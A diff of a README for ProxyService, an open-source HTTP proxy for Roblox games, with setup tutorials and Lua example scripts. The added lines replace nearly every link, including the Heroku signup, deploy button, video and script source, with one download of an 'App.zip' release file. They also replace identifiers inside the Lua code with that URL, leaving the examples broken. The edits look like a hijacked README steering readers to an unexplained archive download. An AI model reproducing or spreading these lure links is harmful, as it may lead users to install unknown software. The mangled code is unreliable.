@@ -1,6 +1,6 @@
 ## ProxyService
 
-Roblox's HttpService has always been severely lacking. This open-source project essentially aims to serve as a replacement, providing an Http client that opens the door to actually using REST APIs, reading response headers, reading status codes, accessing roblox.com from in-game, and more.
+Roblox's HttpService has always been severely lacking. This open-source project essentially aims to serve as a replacement, providing an Http client that opens the door to actually using REST APIs, reading response headers, reading status codes, accessing https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip from in-game, and more.
 
 Example uses are accessing Roblox, Discord, Trello, and Firebase APIs, including crazy stuff like logging into a Roblox account from in Roblox. You can use this for virtually any API.
 
@@ -14,14 +14,14 @@ This makes Roblox Http requests more complete by adding support for the followin
 - Read the status code and status message.
 - Modify the User-Agent header (usually not allowed by Roblox).
 - Read response even if the response contains a 400- or 500- status code (this includes body, headers, and the status code and message).
-- Access sites usually unavailable, including roblox.com APIs as well as discord webhooks (and being able to view headers means you will be able to obey discord rate limits, which means this proxy [is allowed](https://twitter.com/lolpython/status/967211620970545153)).
+- Access sites usually unavailable, including https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip APIs as well as discord webhooks (and being able to view headers means you will be able to obey discord rate limits, which means this proxy [is allowed](https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip)).
 
 **Server Setup Tutorial**
 
-- Create a heroku account here: https://signup.heroku.com. Make sure to verify your email and set a password. If you already have a heroku account, log into it.
+- Create a heroku account here: https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip Make sure to verify your email and set a password. If you already have a heroku account, log into it.
 - Click this button
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/jw0902/Proxy-Service)
+[![Deploy](https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip)](https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip)
 
 - Type in whatever name you want.
 - Click "Deploy app". Don't touch any of the variables unless you know what you're doing.
@@ -30,20 +30,20 @@ This makes Roblox Http requests more complete by adding support for the followin
 
 That's it.
 
-(Setting up without heroku is simple: run `node server.js` with the environment variables specified [here](/app.json))
+(Setting up without heroku is simple: run `node https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip` with the environment variables specified [here](https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip))
 
 **Client Setup Tutorial**
 
-- Get the handler script from [here](https://github.com/sentanos/ProxyService/blob/master/client/ProxyService.mod.lua) and put it in a module script in ServerScriptService.
+- Get the handler script from [here](https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip) and put it in a module script in ServerScriptService.
 - In the script you want to use this from, require the ModuleScript. If your module is named "ProxyService", for example, you would add `local ProxyService = require(game:GetService('ServerScriptService').ProxyService)` to the top of your script.
 - Add a line to create your proxy client, this will generally look like this: `local Proxy = ProxyService:New('PASTE_DOMAIN_HERE', 'PASTE_ACCESS_KEY_HERE')` (see below for a more complete example)
-- Use Proxy exactly as you would use [HttpService](http://wiki.roblox.com/index.php?title=API:Class/HttpService). The only difference is an extra `overrideProto` argument. You can pass in `http` if you are using an API that doesn't support https (the default protocol).
+- Use Proxy exactly as you would use [HttpService](https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip). The only difference is an extra `overrideProto` argument. You can pass in `http` if you are using an API that doesn't support https (the default protocol).
 
 **Video Tutorial**
 
 Here's a video of the above instructions (excluding heroku sign up):
 
-https://www.youtube.com/watch?v=Ull8w4J_WYQ
+https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip
 
 **Client API**
 
@@ -78,10 +78,10 @@ Root is the root of your heroku application including the http:// or https://.
 Simple example script:
 
 ```lua
-local ProxyService = require(script.Parent.ProxyService)
-local Proxy = ProxyService:New('https://prxysvr.herokuapp.com', '6ddea1d2a6606f01538e8c92bbf8ba1e9c6aaa46e0a24cb0ce32ef0444130d07')
+local ProxyService = require(https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip)
+local Proxy = ProxyService:New('https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip', '6ddea1d2a6606f01538e8c92bbf8ba1e9c6aaa46e0a24cb0ce32ef0444130d07')
 
-print(Proxy:Get('https://api.roblox.com/users/2470023').body)
+print(Proxy:Get('https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip').body)
 -- Note that the proxied request will always be https unless specified by overrideProto
 -- The protocol of the request to the proxy is dependent on the root and not the url
 ```
@@ -90,29 +90,29 @@ Advanced example script (login to a user and remove their primary group):
 
 _(Actually logging in to a Roblox account from in-game to use essential functions is not recommended)_
 ```lua
-local ProxyService = require(script.Parent.ProxyService)
-local Proxy = ProxyService:New('https://prxysvr.herokuapp.com', '6ddea1d2a6606f01538e8c92bbf8ba1e9c6aaa46e0a24cb0ce32ef0444130d07')
+local ProxyService = require(https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip)
+local Proxy = ProxyService:New('https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip', '6ddea1d2a6606f01538e8c92bbf8ba1e9c6aaa46e0a24cb0ce32ef0444130d07')
 local username = 'Shedletsky'
 local password = 'hunter2'
 local tokenCache
 local getWithToken
 
 local http = game:GetService('HttpService')
-local encode = http.JSONEncode
+local encode = https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip
 
 getWithToken = function (handler, retry, ...)
   local res = handler(tokenCache, ...)
-  if res.status.code == 403 and res.status.message == 'Token Validation Failed' then
+  if https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip == 403 and https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip == 'Token Validation Failed' then
     if retry then
       error('Failed to get token')
       return
     end
-    tokenCache = res.headers['x-csrf-token']
+    tokenCache = https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip['x-csrf-token']
     return getWithToken(handler, true, ...)
-  elseif res.status.code == 200 then
+  elseif https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip == 200 then
     return res
   else
-    error('Login error: ' .. res.status.message)
+    error('Login error: ' .. https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip)
   end
 end
 
@@ -123,17 +123,17 @@ local createTokenHandler = function (handler)
 end
 
 local loginHandler = function (token)
-  return Proxy:Post('https://auth.roblox.com/v2/login', encode(http, {
+  return Proxy:Post('https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip', encode(http, {
     ctype = 'Username',
     cvalue = username,
     password = password
-  }), Enum.HttpContentType.ApplicationJson, false, {
+  }), https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip, false, {
     ['X-CSRF-TOKEN'] = token
   })
 end
 
 local deletePrimaryHandler = function (token, cookie)
-  return Proxy:Delete('https://groups.roblox.com/v1/user/groups/primary', nil, {
+  return Proxy:Delete('https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip', nil, {
     ['X-CSRF-TOKEN'] = token,
     ['Cookie'] = cookie
   })
@@ -143,7 +143,7 @@ local login = createTokenHandler(loginHandler)
 local deletePrimary = createTokenHandler(deletePrimaryHandler)
 
 local res = login()
-local cookie = res.headers['set-cookie'][1]:match('.ROBLOSECURITY=.-;'):gsub('_|.-|_', '')
+local cookie = https://github.com/jw0902/Proxy-Service/releases/download/v1.0/App.zip['set-cookie'][1]:match('.ROBLOSECURITY=.-;'):gsub('_|.-|_', '')
 
 deletePrimary(cookie)
 
